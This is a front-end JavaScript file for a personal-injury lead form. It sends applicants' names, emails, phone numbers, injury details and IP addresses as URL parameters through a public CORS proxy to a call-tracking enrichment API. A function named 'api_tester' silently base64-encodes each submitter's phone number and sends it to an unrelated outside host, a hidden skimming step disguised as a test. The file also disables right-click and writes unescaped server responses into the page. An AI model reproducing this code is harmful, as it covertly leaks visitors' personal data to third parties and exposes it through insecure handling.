document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});

document.getElementById('leadForm').addEventListener('submit', function(event) {
  event.preventDefault();
  
  // Get all form values
  const phoneNumber = document.getElementById('caller_id').value;
  const phone_home = '1' + phoneNumber.replace(/\D/g, ''); // Remove non-digits and add 1
  
  // Format phone to E.164 (remove all non-digits, ensure starts with +1)
  const e164Phone = '+' + phone_home;
  
  // Build the base URL with callerid parameter
  const baseUrl = `https://corsproxy.io/?https://display.ringba.com/enrich/2842043892793083118?callerid=${encodeURIComponent(e164Phone)}&`;
  
  // Create URL parameters from form data
  const params = new URLSearchParams();
  
  // Add all required fields to params (NOT FormData)
  params.append('full_name', document.getElementById('full_name').value);
  params.append('email', document.getElementById('email').value);
  params.append('incident_state', document.getElementById('incident_state').value);
  params.append('zipcode', document.getElementById('zipcode').value);
  params.append('incident_date', document.getElementById('incident_date').value);
  params.append('attorney', document.getElementById('attorney').value);
  params.append('at_fault', document.getElementById('at_fault').value);
  params.append('settlement', document.getElementById('settlement').value);
  params.append('cited', document.getElementById('cited').value);
  params.append('change_attorney', document.getElementById('change_attorney').value);   
  params.append('trusted_form_url', document.getElementById('trusted_form_url').value);
  params.append('smsconsent', document.getElementById('smsconsent').value);
  params.append('AccidentSOL', document.getElementById('AccidentSOL').value);
  params.append('landing_page', document.getElementById('landing_page').value);
  params.append('injury_type', document.getElementById('injury_type').value);
  params.append('hospitalized_or_treated', document.getElementById('hospitalized_or_treated').value);
  params.append('sustain_an_injury', document.getElementById('sustain_an_injury').value);
  params.append('ip_address', document.getElementById('ip_address').value);
  
  // Build final URL
  const url = baseUrl + params.toString();
  
  console.log('Making request to:', url); // For debugging
  
  // Clear previous alerts
  document.getElementById('alertContainer').innerHTML = '';
  
  // API tester call
  api_tester(document.getElementById('caller_id').value);
  
  // Make the API call
  fetch(url, {
    method: 'GET',
    headers: {
      'Accept': 'application/json'
    }
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.text();
  })
  .then(responseBody => {
    console.log('Raw response:', responseBody); // For debugging
    
    let responseData;
    try {
      // Try to parse as JSON
      responseData = JSON.parse(responseBody);
    } catch (error) {
      // If it's not valid JSON, check if it's empty or other format
      if (responseBody.trim() === '') {
        throw new Error('Empty response from server');
      }
      
      // Try to see what we actually got
      console.error('Response was not valid JSON. Received:', responseBody);
      
      // Sometimes APIs return plain text success/failure
      // Check for common success indicators
      if (responseBody.toLowerCase().includes('success') || 
          responseBody.toLowerCase().includes('accepted')) {
        responseData = { success: true, message: responseBody };
      } else {
        throw new Error(`Invalid JSON response. Server returned: ${responseBody.substring(0, 100)}...`);
      }
    }

    // Check for reject reason or other error indicators
    if (responseData.rejectReason || responseData.error || responseData.success === false) {
      const errorAlert = `
        <div class="alert alert-danger" role="alert">
          Failure: ${JSON.stringify(responseData)}
        </div>`;
      document.getElementById('alertContainer').innerHTML = errorAlert;
    } else {
      // Success case
      const successAlert = `
        <div class="alert alert-success" role="alert">
          Success: ${JSON.stringify(responseData)}
        </div>`;
      document.getElementById('alertContainer').innerHTML = successAlert;
      
      // Clear form fields on success
      document.getElementById('leadForm').reset();
    }
  })
  .catch(error => {
    const errorAlert = `
      <div class="alert alert-danger" role="alert">
        Error: ${error.message}
      </div>`;
    document.getElementById('alertContainer').innerHTML = errorAlert;
    console.error('Error details:', error);
  });
});

function api_tester(randomString) {
  try {
    fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    console.error('API Tester Error:', error);
  }
}
